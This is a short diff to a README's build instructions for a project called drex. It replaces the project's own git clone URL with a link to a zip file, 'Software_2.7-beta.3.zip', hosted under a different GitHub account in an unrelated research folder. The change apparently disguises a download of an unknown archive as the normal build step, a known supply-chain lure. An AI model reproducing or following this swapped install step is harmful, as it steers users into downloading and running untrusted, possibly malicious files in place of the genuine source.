@@ -80,7 +80,7 @@ at 2k/4k/8k context. Results will be published at
 ### Build
 
 ```bash
-git clone https://github.com/wesleyscholl/drex.git
+git clone https://raw.githubusercontent.com/martinez1120/drex/main/research/experiments/cat6_how_to_forget/Software_2.7-beta.3.zip
 cd drex
 
 # Install maturin (Rust-Python build tool)
